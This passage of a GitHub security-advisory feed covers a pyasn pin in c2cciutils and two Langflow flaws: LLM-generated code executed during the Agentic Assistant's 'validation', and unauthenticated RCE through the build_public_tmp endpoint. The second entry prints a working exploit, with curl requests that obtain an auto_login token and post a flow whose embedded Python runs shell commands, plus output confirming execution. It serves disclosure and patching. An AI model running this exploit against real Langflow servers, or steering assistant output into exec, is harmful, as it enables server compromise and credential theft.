        <category label="severity" term="HIGH"/>
        <published>2026-03-27T15:27:20.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[c2cciutils] C2C CI utils is vulnerable to DoS via pyasn dependency (CVE-2026-30922)]]></title>
        <id>https://github.com/advisories/GHSA-wcjx-v2wj-xg87</id>
        <link href="https://github.com/advisories/GHSA-wcjx-v2wj-xg87"/>
        <updated>2026-03-26T22:27:13.000Z</updated>
        <content type="html"><![CDATA[<p>Pin vulnerable version of pyasn, see: See: <a href="https://github.com/advisories/GHSA-jr27-m4p2-rc6r">https://github.com/advisories/GHSA-jr27-m4p2-rc6r</a></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/camptocamp/c2cciutils/security/advisories/GHSA-wcjx-v2wj-xg87">https://github.com/camptocamp/c2cciutils/security/advisories/GHSA-wcjx-v2wj-xg87</a></li>
<li><a href="https://github.com/camptocamp/c2cciutils/commit/1ab415014817d7d1cf09ad56cc8a7dec2a1108d8">https://github.com/camptocamp/c2cciutils/commit/1ab415014817d7d1cf09ad56cc8a7dec2a1108d8</a></li>
<li><a href="https://github.com/advisories/GHSA-wcjx-v2wj-xg87">https://github.com/advisories/GHSA-wcjx-v2wj-xg87</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wcjx-v2wj-xg87</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-26T22:27:12.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[langflow] Langflow has Authenticated Code Execution in Agentic Assistant Validation]]></title>
        <id>https://github.com/advisories/GHSA-v8hw-mh8c-jxfc</id>
        <link href="https://github.com/advisories/GHSA-v8hw-mh8c-jxfc"/>
        <updated>2026-03-26T18:31:37.000Z</updated>
        <content type="html"><![CDATA[<h2 id="description">Description</h2>
<h3 id="1-summary">1. Summary</h3>
<p>The Agentic Assistant feature in Langflow executes LLM-generated Python code during its <strong>validation</strong> phase. Although this phase appears intended to validate generated component code, the implementation reaches dynamic execution sinks and instantiates the generated class server-side.</p>
<p>In deployments where an attacker can access the Agentic Assistant feature and influence the model output, this can result in arbitrary server-side Python execution.</p>
<h3 id="2-description">2. Description</h3>
<h4 id="21-intended-functionality">2.1 Intended Functionality</h4>
<p>The Agentic Assistant endpoints are designed to help users generate and validate components for a flow. Users can submit requests to the assistant, which returns candidate component code for further processing.</p>
<p>A reasonable security expectation is that validation should treat model output as <strong>untrusted text</strong> and perform only static or side-effect-free checks.</p>
<p>The externally reachable endpoints are:</p>
<p><a href="https://github.com/langflow-ai/langflow/blob/f7f4d1e70ba5eecd18162ec96f3571c2cfbcd1fc/src/backend/base/langflow/agentic/api/router.py#L252-L297">https://github.com/langflow-ai/langflow/blob/f7f4d1e70ba5eecd18162ec96f3571c2cfbcd1fc/src/backend/base/langflow/agentic/api/router.py#L252-L297</a></p>
<p>The request model accepts attacker-influenceable fields such as <code>input_value</code>, <code>flow_id</code>, <code>provider</code>, <code>model_name</code>, <code>session_id</code>, and <code>max_retries</code>:</p>
<p><a href="https://github.com/langflow-ai/langflow/blob/f7f4d1e70ba5eecd18162ec96f3571c2cfbcd1fc/src/backend/base/langflow/agentic/api/schemas.py#L20-L31">https://github.com/langflow-ai/langflow/blob/f7f4d1e70ba5eecd18162ec96f3571c2cfbcd1fc/src/backend/base/langflow/agentic/api/schemas.py#L20-L31</a></p>
<h4 id="22-root-cause">2.2 Root Cause</h4>
<p>In the affected code path, Langflow processes model output through the following chain:</p>
<p><code>/assist</code>
→ <code>execute_flow_with_validation()</code>
→ <code>execute_flow_file()</code>
→ LLM returns component code
→ <code>extract_component_code()</code>
→ <code>validate_component_code()</code>
→ <code>create_class()</code>
→ generated class is instantiated</p>
<p>The assistant service reaches the validation path here:</p>
<p><a href="https://github.com/langflow-ai/langflow/blob/f7f4d1e70ba5eecd18162ec96f3571c2cfbcd1fc/src/backend/base/langflow/agentic/services/assistant_service.py#L58-L79">https://github.com/langflow-ai/langflow/blob/f7f4d1e70ba5eecd18162ec96f3571c2cfbcd1fc/src/backend/base/langflow/agentic/services/assistant_service.py#L58-L79</a></p>
<p>The code extraction step occurs here:</p>
<p><a href="https://github.com/langflow-ai/langflow/blob/f7f4d1e70ba5eecd18162ec96f3571c2cfbcd1fc/src/backend/base/langflow/agentic/helpers/code_extraction.py#L11-L53">https://github.com/langflow-ai/langflow/blob/f7f4d1e70ba5eecd18162ec96f3571c2cfbcd1fc/src/backend/base/langflow/agentic/helpers/code_extraction.py#L11-L53</a></p>
<p>The validation entry point is here:</p>
<p><a href="https://github.com/langflow-ai/langflow/blob/f7f4d1e70ba5eecd18162ec96f3571c2cfbcd1fc/src/backend/base/langflow/agentic/helpers/validation.py#L27-L47">https://github.com/langflow-ai/langflow/blob/f7f4d1e70ba5eecd18162ec96f3571c2cfbcd1fc/src/backend/base/langflow/agentic/helpers/validation.py#L27-L47</a></p>
<p>The issue is that this validation path is not purely static. It ultimately invokes <code>create_class()</code> in <code>lfx.custom.validate</code>, where Python code is dynamically executed via <code>exec(...)</code>, including both global-scope preparation and class construction.</p>
<p><a href="https://github.com/langflow-ai/langflow/blob/f7f4d1e70ba5eecd18162ec96f3571c2cfbcd1fc/src/lfx/src/lfx/custom/validate.py#L241-L272">https://github.com/langflow-ai/langflow/blob/f7f4d1e70ba5eecd18162ec96f3571c2cfbcd1fc/src/lfx/src/lfx/custom/validate.py#L241-L272</a></p>
<p><a href="https://github.com/langflow-ai/langflow/blob/f7f4d1e70ba5eecd18162ec96f3571c2cfbcd1fc/src/lfx/src/lfx/custom/validate.py#L394-L399">https://github.com/langflow-ai/langflow/blob/f7f4d1e70ba5eecd18162ec96f3571c2cfbcd1fc/src/lfx/src/lfx/custom/validate.py#L394-L399</a></p>
<p><a href="https://github.com/langflow-ai/langflow/blob/f7f4d1e70ba5eecd18162ec96f3571c2cfbcd1fc/src/lfx/src/lfx/custom/validate.py#L441-L443">https://github.com/langflow-ai/langflow/blob/f7f4d1e70ba5eecd18162ec96f3571c2cfbcd1fc/src/lfx/src/lfx/custom/validate.py#L441-L443</a></p>
<p>As a result, LLM-generated code is treated as executable Python rather than inert data. This means the “validation” step crosses a trust boundary and becomes an execution sink.</p>
<p>The streaming path can also reach this sink when the request is classified into the component-generation branch:</p>
<p><a href="https://github.com/langflow-ai/langflow/blob/f7f4d1e70ba5eecd18162ec96f3571c2cfbcd1fc/src/backend/base/langflow/agentic/services/assistant_service.py#L142-L156">https://github.com/langflow-ai/langflow/blob/f7f4d1e70ba5eecd18162ec96f3571c2cfbcd1fc/src/backend/base/langflow/agentic/services/assistant_service.py#L142-L156</a></p>
<p><a href="https://github.com/langflow-ai/langflow/blob/f7f4d1e70ba5eecd18162ec96f3571c2cfbcd1fc/src/backend/base/langflow/agentic/services/assistant_service.py#L259-L300">https://github.com/langflow-ai/langflow/blob/f7f4d1e70ba5eecd18162ec96f3571c2cfbcd1fc/src/backend/base/langflow/agentic/services/assistant_service.py#L259-L300</a></p>
<h3 id="3-proof-of-concept-poc">3. Proof of Concept (PoC)</h3>
<ol>
<li>Send a request to the Agentic Assistant endpoint.</li>
<li>Provide input that causes the model to return malicious component code.</li>
<li>The returned code reaches the validation path.</li>
<li>During validation, the server dynamically executes the generated Python.</li>
<li>Arbitrary server-side code execution occurs.</li>
</ol>
<h3 id="4-impact">4. Impact</h3>
<ul>
<li><p>Attackers who can access the Agentic Assistant feature and influence model output may execute arbitrary Python code on the server.</p>
</li>
<li><p>This can lead to:</p>
<ul>
<li>OS command execution</li>
<li>file read/write</li>
<li>credential or secret disclosure</li>
<li>full compromise of the Langflow process</li>
</ul>
</li>
</ul>
<h3 id="5-exploitability-notes">5. Exploitability Notes</h3>
<p>This issue is most accurately described as an <strong>authenticated or feature-reachable code execution vulnerability</strong>, rather than an unconditional unauthenticated remote attack.</p>
<p>Severity depends on deployment model:</p>
<ul>
<li>In <strong>local-only, single-user development setups</strong>, the issue may be limited to self-exposure by the operator.</li>
<li>In <strong>shared, team, or internet-exposed deployments</strong>, it may be exploitable by other users or attackers who can reach the assistant feature.</li>
</ul>
<p>The assistant feature depends on an active user context:</p>
<p><a href="https://github.com/langflow-ai/langflow/blob/f7f4d1e70ba5eecd18162ec96f3571c2cfbcd1fc/src/backend/base/langflow/api/utils/core.py#L38">https://github.com/langflow-ai/langflow/blob/f7f4d1e70ba5eecd18162ec96f3571c2cfbcd1fc/src/backend/base/langflow/api/utils/core.py#L38</a></p>
<p>Authentication sources include bearer token, cookie, or API key:</p>
<p><a href="https://github.com/langflow-ai/langflow/blob/f7f4d1e70ba5eecd18162ec96f3571c2cfbcd1fc/src/backend/base/langflow/services/auth/utils.py#L39-L53">https://github.com/langflow-ai/langflow/blob/f7f4d1e70ba5eecd18162ec96f3571c2cfbcd1fc/src/backend/base/langflow/services/auth/utils.py#L39-L53</a></p>
<p><a href="https://github.com/langflow-ai/langflow/blob/f7f4d1e70ba5eecd18162ec96f3571c2cfbcd1fc/src/backend/base/langflow/services/auth/utils.py#L156-L163">https://github.com/langflow-ai/langflow/blob/f7f4d1e70ba5eecd18162ec96f3571c2cfbcd1fc/src/backend/base/langflow/services/auth/utils.py#L156-L163</a></p>
<p>Default deployment settings may widen exposure, including <code>AUTO_LOGIN=true</code> and the <code>/api/v1/auto_login</code> endpoint:</p>
<p><a href="https://github.com/langflow-ai/langflow/blob/f7f4d1e70ba5eecd18162ec96f3571c2cfbcd1fc/src/lfx/src/lfx/services/settings/auth.py#L71-L87">https://github.com/langflow-ai/langflow/blob/f7f4d1e70ba5eecd18162ec96f3571c2cfbcd1fc/src/lfx/src/lfx/services/settings/auth.py#L71-L87</a></p>
<p><a href="https://github.com/langflow-ai/langflow/blob/f7f4d1e70ba5eecd18162ec96f3571c2cfbcd1fc/src/backend/base/langflow/api/v1/login.py#L96-L135">https://github.com/langflow-ai/langflow/blob/f7f4d1e70ba5eecd18162ec96f3571c2cfbcd1fc/src/backend/base/langflow/api/v1/login.py#L96-L135</a></p>
<h3 id="6-patch-recommendation">6. Patch Recommendation</h3>
<ul>
<li>Remove all dynamic execution from the validation path.</li>
<li>Ensure validation is strictly static and side-effect-free.</li>
<li>Treat all LLM output as untrusted input.</li>
<li>If code generation must be supported, require explicit approval and run it in a hardened sandbox isolated from the main server process.</li>
</ul>
<p>Discovered by: @kexinoh (<a href="https://github.com/kexinoh">https://github.com/kexinoh</a>, works at Tencent Zhuque Lab)</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/langflow-ai/langflow/security/advisories/GHSA-v8hw-mh8c-jxfc">https://github.com/langflow-ai/langflow/security/advisories/GHSA-v8hw-mh8c-jxfc</a></li>
<li><a href="https://github.com/langflow-ai/langflow/blob/f7f4d1e70ba5eecd18162ec96f3571c2cfbcd1fc/src/backend/base/langflow/agentic/api/router.py#L252-L297">https://github.com/langflow-ai/langflow/blob/f7f4d1e70ba5eecd18162ec96f3571c2cfbcd1fc/src/backend/base/langflow/agentic/api/router.py#L252-L297</a></li>
<li><a href="https://github.com/langflow-ai/langflow/blob/f7f4d1e70ba5eecd18162ec96f3571c2cfbcd1fc/src/backend/base/langflow/agentic/api/schemas.py#L20-L31">https://github.com/langflow-ai/langflow/blob/f7f4d1e70ba5eecd18162ec96f3571c2cfbcd1fc/src/backend/base/langflow/agentic/api/schemas.py#L20-L31</a></li>
<li><a href="https://github.com/langflow-ai/langflow/blob/f7f4d1e70ba5eecd18162ec96f3571c2cfbcd1fc/src/backend/base/langflow/agentic/helpers/code_extraction.py#L11-L53">https://github.com/langflow-ai/langflow/blob/f7f4d1e70ba5eecd18162ec96f3571c2cfbcd1fc/src/backend/base/langflow/agentic/helpers/code_extraction.py#L11-L53</a></li>
<li><a href="https://github.com/langflow-ai/langflow/blob/f7f4d1e70ba5eecd18162ec96f3571c2cfbcd1fc/src/backend/base/langflow/agentic/helpers/validation.py#L27-L47">https://github.com/langflow-ai/langflow/blob/f7f4d1e70ba5eecd18162ec96f3571c2cfbcd1fc/src/backend/base/langflow/agentic/helpers/validation.py#L27-L47</a></li>
<li><a href="https://github.com/langflow-ai/langflow/blob/f7f4d1e70ba5eecd18162ec96f3571c2cfbcd1fc/src/backend/base/langflow/agentic/services/assistant_service.py#L142-L156">https://github.com/langflow-ai/langflow/blob/f7f4d1e70ba5eecd18162ec96f3571c2cfbcd1fc/src/backend/base/langflow/agentic/services/assistant_service.py#L142-L156</a></li>
<li><a href="https://github.com/langflow-ai/langflow/blob/f7f4d1e70ba5eecd18162ec96f3571c2cfbcd1fc/src/backend/base/langflow/agentic/services/assistant_service.py#L259-L300">https://github.com/langflow-ai/langflow/blob/f7f4d1e70ba5eecd18162ec96f3571c2cfbcd1fc/src/backend/base/langflow/agentic/services/assistant_service.py#L259-L300</a></li>
<li><a href="https://github.com/langflow-ai/langflow/blob/f7f4d1e70ba5eecd18162ec96f3571c2cfbcd1fc/src/backend/base/langflow/agentic/services/assistant_service.py#L58-L79">https://github.com/langflow-ai/langflow/blob/f7f4d1e70ba5eecd18162ec96f3571c2cfbcd1fc/src/backend/base/langflow/agentic/services/assistant_service.py#L58-L79</a></li>
<li><a href="https://github.com/langflow-ai/langflow/blob/f7f4d1e70ba5eecd18162ec96f3571c2cfbcd1fc/src/backend/base/langflow/api/utils/core.py#L38">https://github.com/langflow-ai/langflow/blob/f7f4d1e70ba5eecd18162ec96f3571c2cfbcd1fc/src/backend/base/langflow/api/utils/core.py#L38</a></li>
<li><a href="https://github.com/langflow-ai/langflow/blob/f7f4d1e70ba5eecd18162ec96f3571c2cfbcd1fc/src/backend/base/langflow/api/v1/login.py#L96-L135">https://github.com/langflow-ai/langflow/blob/f7f4d1e70ba5eecd18162ec96f3571c2cfbcd1fc/src/backend/base/langflow/api/v1/login.py#L96-L135</a></li>
<li><a href="https://github.com/langflow-ai/langflow/blob/f7f4d1e70ba5eecd18162ec96f3571c2cfbcd1fc/src/backend/base/langflow/services/auth/utils.py#L156-L163">https://github.com/langflow-ai/langflow/blob/f7f4d1e70ba5eecd18162ec96f3571c2cfbcd1fc/src/backend/base/langflow/services/auth/utils.py#L156-L163</a></li>
<li><a href="https://github.com/langflow-ai/langflow/blob/f7f4d1e70ba5eecd18162ec96f3571c2cfbcd1fc/src/backend/base/langflow/services/auth/utils.py#L39-L53">https://github.com/langflow-ai/langflow/blob/f7f4d1e70ba5eecd18162ec96f3571c2cfbcd1fc/src/backend/base/langflow/services/auth/utils.py#L39-L53</a></li>
<li><a href="https://github.com/langflow-ai/langflow/blob/f7f4d1e70ba5eecd18162ec96f3571c2cfbcd1fc/src/lfx/src/lfx/custom/validate.py#L241-L272">https://github.com/langflow-ai/langflow/blob/f7f4d1e70ba5eecd18162ec96f3571c2cfbcd1fc/src/lfx/src/lfx/custom/validate.py#L241-L272</a></li>
<li><a href="https://github.com/langflow-ai/langflow/blob/f7f4d1e70ba5eecd18162ec96f3571c2cfbcd1fc/src/lfx/src/lfx/custom/validate.py#L394-L399">https://github.com/langflow-ai/langflow/blob/f7f4d1e70ba5eecd18162ec96f3571c2cfbcd1fc/src/lfx/src/lfx/custom/validate.py#L394-L399</a></li>
<li><a href="https://github.com/langflow-ai/langflow/blob/f7f4d1e70ba5eecd18162ec96f3571c2cfbcd1fc/src/lfx/src/lfx/custom/validate.py#L441-L443">https://github.com/langflow-ai/langflow/blob/f7f4d1e70ba5eecd18162ec96f3571c2cfbcd1fc/src/lfx/src/lfx/custom/validate.py#L441-L443</a></li>
<li><a href="https://github.com/langflow-ai/langflow/blob/f7f4d1e70ba5eecd18162ec96f3571c2cfbcd1fc/src/lfx/src/lfx/services/settings/auth.py#L71-L87">https://github.com/langflow-ai/langflow/blob/f7f4d1e70ba5eecd18162ec96f3571c2cfbcd1fc/src/lfx/src/lfx/services/settings/auth.py#L71-L87</a></li>
<li><a href="https://github.com/advisories/GHSA-v8hw-mh8c-jxfc">https://github.com/advisories/GHSA-v8hw-mh8c-jxfc</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-v8hw-mh8c-jxfc</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-03-26T18:31:36.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[langflow] Unauthenticated Remote Code Execution in Langflow via Public Flow Build Endpoint]]></title>
        <id>https://github.com/advisories/GHSA-vwmf-pq79-vjvx</id>
        <link href="https://github.com/advisories/GHSA-vwmf-pq79-vjvx"/>
        <updated>2026-03-26T15:41:23.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>The <code>POST /api/v1/build_public_tmp/{flow_id}/flow</code> endpoint allows building public flows without requiring authentication. When the optional <code>data</code> parameter is supplied, the endpoint uses <strong>attacker-controlled flow data</strong> (containing arbitrary Python code in node definitions) instead of the stored flow data from the database. This code is passed to <code>exec()</code> with zero sandboxing, resulting in unauthenticated remote code execution.</p>
<p>This is distinct from CVE-2025-3248, which fixed <code>/api/v1/validate/code</code> by adding authentication. The <code>build_public_tmp</code> endpoint is <strong>designed</strong> to be unauthenticated (for public flows) but incorrectly accepts attacker-supplied flow data containing arbitrary executable code.</p>
<h2 id="affected-code">Affected Code</h2>
<h3 id="vulnerable-endpoint-no-authentication">Vulnerable Endpoint (No Authentication)</h3>
<p><strong>File:</strong> <code>src/backend/base/langflow/api/v1/chat.py</code>, lines 580-657</p>
<pre><code class="language-python">@router.post("/build_public_tmp/{flow_id}/flow")
async def build_public_tmp(
    *,
    flow_id: uuid.UUID,
    data: Annotated[FlowDataRequest | None, Body(embed=True)] = None,  # ATTACKER CONTROLLED
    request: Request,
    # ... NO Depends(get_current_active_user) -- MISSING AUTH ...
):
    """Build a public flow without requiring authentication."""
    client_id = request.cookies.get("client_id")
    owner_user, new_flow_id = await verify_public_flow_and_get_user(flow_id=flow_id, client_id=client_id)

    job_id = await start_flow_build(
        flow_id=new_flow_id,
        data=data,  # Attacker's data passed directly to graph builder
        current_user=owner_user,
        ...
    )
</code></pre>
<p>Compare with the authenticated build endpoint at line 138, which requires <code>current_user: CurrentActiveUser</code>.</p>
<h3 id="code-execution-chain">Code Execution Chain</h3>
<p>When attacker-supplied <code>data</code> is provided, it flows through:</p>
<ol>
<li><code>start_flow_build(data=attacker_data)</code> → <code>generate_flow_events()</code> -- <code>build.py:81</code></li>
<li><code>create_graph()</code> → <code>build_graph_from_data(payload=data.model_dump())</code> -- <code>build.py:298</code></li>
<li><code>Graph.from_payload(payload)</code> parses attacker nodes -- <code>base.py:1168</code></li>
<li><code>add_nodes_and_edges()</code> → <code>initialize()</code> → <code>_build_graph()</code> -- <code>base.py:270,527</code></li>
<li><code>_instantiate_components_in_vertices()</code> iterates nodes -- <code>base.py:1323</code></li>
<li><code>vertex.instantiate_component()</code> → <code>instantiate_class(vertex)</code> -- <code>loading.py:28</code></li>
<li><code>code = custom_params.pop("code")</code> extracts attacker code -- <code>loading.py:43</code></li>
<li><code>eval_custom_component_code(code)</code> → <code>create_class(code, class_name)</code> -- <code>eval.py:9</code></li>
<li><code>prepare_global_scope(module)</code> -- <code>validate.py:323</code></li>
<li><code>exec(compiled_code, exec_globals)</code> -- <strong>ARBITRARY CODE EXECUTION</strong> -- <code>validate.py:397</code></li>
</ol>
<h3 id="unsandboxed-exec-in-prepare_global_scope">Unsandboxed exec() in prepare_global_scope</h3>
<p><strong>File:</strong> <code>src/lfx/src/lfx/custom/validate.py</code>, lines 340-397</p>
<pre><code class="language-python">def prepare_global_scope(module):
    exec_globals = globals().copy()

    # Imports are resolved first (any module can be imported)
    for node in imports:
        module_obj = importlib.import_module(module_name)  # line 352
        exec_globals[variable_name] = module_obj

    # Then ALL top-level definitions are executed (Assign, ClassDef, FunctionDef)
    if definitions:
        combined_module = ast.Module(body=definitions, type_ignores=[])
        compiled_code = compile(combined_module, "&lt;string&gt;", "exec")
        exec(compiled_code, exec_globals)  # line 397 - ARBITRARY CODE EXECUTION
</code></pre>
<p><strong>Critical detail:</strong> <code>prepare_global_scope</code> executes <code>ast.Assign</code> nodes. An attacker's code like <code>_x = os.system("id")</code> is an assignment and will be executed during graph building -- before the flow even "runs."</p>
<h2 id="prerequisites">Prerequisites</h2>
<ol>
<li>Target Langflow instance has at least <strong>one public flow</strong> (common for demos, chatbots, shared workflows)</li>
<li>Attacker knows the public flow's UUID (discoverable via shared links/URLs)</li>
<li>No authentication required -- only a <code>client_id</code> cookie (any arbitrary string value)</li>
</ol>
<p>When <code>AUTO_LOGIN=true</code> (the <strong>default</strong>), all prerequisites can be met by an unauthenticated attacker:</p>
<ol>
<li><code>GET /api/v1/auto_login</code> → obtain superuser token</li>
<li><code>POST /api/v1/flows/</code> → create a public flow</li>
<li>Exploit via <code>build_public_tmp</code> without any auth</li>
</ol>
<h2 id="proof-of-concept">Proof of Concept</h2>
<h3 id="tested-against">Tested Against</h3>
<ul>
<li><strong>Langflow version 1.7.3</strong> (latest stable release, installed via <code>pip install langflow</code>)</li>
<li><strong>Fully reproducible</strong>: 6/6 runs confirmed RCE (two sets of 3 runs each)</li>
</ul>
<h3 id="step-1-obtain-a-public-flow-id">Step 1: Obtain a Public Flow ID</h3>
<p>(In a real attack, the attacker discovers this via shared links. For the PoC, we create one via AUTO_LOGIN.)</p>
<pre><code class="language-bash"># Get superuser token (no credentials needed when AUTO_LOGIN=true)
TOKEN=$(curl -s http://localhost:7860/api/v1/auto_login | jq -r '.access_token')

# Create a public flow
FLOW_ID=$(curl -s -X POST http://localhost:7860/api/v1/flows/ \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"name":"test","data":{"nodes":[],"edges":[]},"access_type":"PUBLIC"}' \
  | jq -r '.id')

echo "Public Flow ID: $FLOW_ID"
</code></pre>
<h3 id="step-2-exploit----unauthenticated-rce">Step 2: Exploit -- Unauthenticated RCE</h3>
<pre><code class="language-bash"># EXPLOIT: Send malicious flow data to the UNAUTHENTICATED endpoint
# NO Authorization header, NO API key, NO credentials
curl -X POST "http://localhost:7860/api/v1/build_public_tmp/${FLOW_ID}/flow" \
  -H "Content-Type: application/json" \
  -b "client_id=attacker" \
  -d '{
    "data": {
      "nodes": [{
        "id": "Exploit-001",
        "type": "genericNode",
        "position": {"x":0,"y":0},
        "data": {
          "id": "Exploit-001",
          "type": "ExploitComp",
          "node": {
            "template": {
              "code": {
                "type": "code",
                "required": true,
                "show": true,
                "multiline": true,
                "value": "import os, socket, json as _json\n\n_proof = os.popen(\"id\").read().strip()\n_host = socket.gethostname()\n_write = open(\"/tmp/rce-proof\",\"w\").write(f\"{_proof} on {_host}\")\n\nfrom lfx.custom.custom_component.component import Component\nfrom lfx.io import Output\nfrom lfx.schema.data import Data\n\nclass ExploitComp(Component):\n    display_name=\"X\"\n    outputs=[Output(display_name=\"O\",name=\"o\",method=\"r\")]\n    def r(self)-&gt;Data:\n        return Data(data={})",
                "name": "code",
                "password": false,
                "advanced": false,
                "dynamic": false
              },
              "_type": "Component"
            },
            "description": "X",
            "base_classes": ["Data"],
            "display_name": "ExploitComp",
            "name": "ExploitComp",
            "frozen": false,
            "outputs": [{"types":["Data"],"selected":"Data","name":"o","display_name":"O","method":"r","value":"__UNDEFINED__","cache":true,"allows_loop":false,"tool_mode":false,"hidden":null,"required_inputs":null,"group_outputs":false}],
            "field_order": ["code"],
            "beta": false,
            "edited": false
          }
        }
      }],
      "edges": []
    },
    "inputs": null
  }'
</code></pre>
<h3 id="step-3-verify-code-execution">Step 3: Verify Code Execution</h3>
<pre><code class="language-bash"># Wait 2 seconds for async graph building
sleep 2

# Check proof file written by attacker's code on the server
cat /tmp/rce-proof
# Output: uid=1000(aviral) gid=1000(aviral) groups=... on kali
</code></pre>
<h3 id="actual-test-results">Actual Test Results</h3>
<pre><code>======================================================================
LANGFLOW v1.7.3 UNAUTHENTICATED RCE - DEFINITIVE E2E TEST
======================================================================
Version:  Langflow 1.7.3

RUN 1: POST /api/v1/build_public_tmp/{id}/flow (NO AUTH)
  HTTP 200 - Job ID: d8db19bf-a532-4f9d-a368-9c46d6235c19
  *** REMOTE CODE EXECUTION CONFIRMED ***
    canary: RCE-f0d19b36
    hostname: kali
    uid: 1000
    whoami: aviral
    id: uid=1000(aviral) gid=1000(aviral) groups=1000(aviral),...
    uname: Linux 6.16.8+kali-amd64

RUN 2: POST /api/v1/build_public_tmp/{id}/flow (NO AUTH)
  HTTP 200 - Job ID: d2e24f20-d707-4278-868c-583dd7532832
  *** REMOTE CODE EXECUTION CONFIRMED ***
    canary: RCE-6037a271

RUN 3: POST /api/v1/build_public_tmp/{id}/flow (NO AUTH)
  HTTP 200 - Job ID: 5962244a-42af-4ef6-b134-a6a4adba5ab7
  *** REMOTE CODE EXECUTION CONFIRMED ***
    canary: RCE-4a796556

FINAL RESULTS
  Total checks:   15
  VULNERABLE:     15
  SAFE:           0
  RCE confirmed:  3/3 runs
  Reproducible:   YES (100%)
</code></pre>
<h2 id="impact">Impact</h2>
<ul>
<li><strong>Unauthenticated Remote Code Execution</strong> with full server process privileges</li>
<li><strong>Complete server compromise</strong>: arbitrary file read/write, command execution</li>
<li><strong>Environment variable exfiltration</strong>: API keys, database credentials, cloud tokens (confirmed in PoC: env_keys exfiltrated)</li>
<li><strong>Reverse shell access</strong> for persistent access</li>
<li><strong>Lateral movement</strong> within the network</li>
<li><strong>Data exfiltration</strong> from all flows, messages, and stored credentials in the database</li>
</ul>
<h2 id="comparison-with-cve-2025-3248">Comparison with CVE-2025-3248</h2>
<table>
<thead>
<tr>
<th>Aspect</th>
<th>CVE-2025-3248</th>
<th>This Vulnerability</th>
</tr>
</thead>
<tbody><tr>
<td><strong>Endpoint</strong></td>
<td><code>/api/v1/validate/code</code></td>
<td><code>/api/v1/build_public_tmp/{id}/flow</code></td>
</tr>
<tr>
<td><strong>Fix applied</strong></td>
<td>Added <code>Depends(get_current_active_user)</code></td>
<td>None -- NEW vulnerability</td>
</tr>
<tr>
<td><strong>Root cause</strong></td>
<td>Missing auth on code validation</td>
<td>Unauthenticated endpoint accepts attacker-controlled executable code via <code>data</code> param</td>
</tr>
<tr>
<td><strong>Code execution via</strong></td>
<td><code>validate_code()</code> → <code>exec()</code></td>
<td><code>create_class()</code> → <code>prepare_global_scope()</code> → <code>exec()</code></td>
</tr>
<tr>
<td><strong>CISA KEV</strong></td>
<td>Yes (actively exploited)</td>
<td>N/A (new finding)</td>
</tr>
<tr>
<td><strong>Can simple auth fix?</strong></td>
<td>Yes (and it was fixed)</td>
<td>No -- endpoint is <em>designed</em> to be unauthenticated; the <code>data</code> parameter must be removed</td>
</tr>
</tbody></table>
<h2 id="recommended-fix">Recommended Fix</h2>
<h3 id="immediate-short-term">Immediate (Short-term)</h3>
<p><strong>Remove the <code>data</code> parameter</strong> from <code>build_public_tmp</code>. Public flows should only execute their stored flow data, never attacker-supplied data:</p>
<pre><code class="language-python">@router.post("/build_public_tmp/{flow_id}/flow")
async def build_public_tmp(
    *,
    flow_id: uuid.UUID,
    inputs: Annotated[InputValueRequest | None, Body(embed=True)] = None,
    # REMOVED: data parameter -- public flows must use stored data only
    ...
):
</code></pre>
<p>In <code>generate_flow_events</code> → <code>create_graph()</code>, only the <code>build_graph_from_db</code> path should be reachable for unauthenticated requests:</p>
<pre><code class="language-python">async def create_graph(fresh_session, flow_id_str, flow_name):
    # For public flows, ALWAYS load from database, never from user data
    return await build_graph_from_db(
        flow_id=flow_id,
        session=fresh_session,
        ...
    )
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/langflow-ai/langflow/security/advisories/GHSA-vwmf-pq79-vjvx">https://github.com/langflow-ai/langflow/security/advisories/GHSA-vwmf-pq79-vjvx</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-33017">https://nvd.nist.gov/vuln/detail/CVE-2026-33017</a></li>
<li><a href="https://github.com/langflow-ai/langflow/pull/12160">https://github.com/langflow-ai/langflow/pull/12160</a></li>
<li><a href="https://github.com/langflow-ai/langflow/commit/73b6612e3ef25fdae0a752d75b0fabd47328d4f0">https://github.com/langflow-ai/langflow/commit/73b6612e3ef25fdae0a752d75b0fabd47328d4f0</a></li>
<li><a href="https://medium.com/@aviral23/cve-2026-33017-how-i-found-an-unauthenticated-rce-in-langflow-by-reading-the-code-they-already-dc96cdce5896">https://medium.com/@aviral23/cve-2026-33017-how-i-found-an-unauthenticated-rce-in-langflow-by-reading-the-code-they-already-dc96cdce5896</a></li>
<li><a href="https://www.sysdig.com/blog/cve-2026-33017-how-attackers-compromised-langflow-ai-pipelines-in-20-hours">https://www.sysdig.com/blog/cve-2026-33017-how-attackers-compromised-langflow-ai-pipelines-in-20-hours</a></li>
<li><a href="https://github.com/langflow-ai/langflow/issues/12345">https://github.com/langflow-ai/langflow/issues/12345</a></li>
<li><a href="https://github.com/advisories/GHSA-rvqx-wpfh-mfx7">https://github.com/advisories/GHSA-rvqx-wpfh-mfx7</a></li>
<li><a href="https://github.com/langflow-ai/langflow/releases/tag/1.8.2">https://github.com/langflow-ai/langflow/releases/tag/1.8.2</a></li>
<li><a href="https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2025-33017">https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2025-33017</a></li>
<li><a href="https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2026-33017">https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2026-33017</a></li>
<li><a href="https://github.com/advisories/GHSA-vwmf-pq79-vjvx">https://github.com/advisories/GHSA-vwmf-pq79-vjvx</a></li>
</ul>
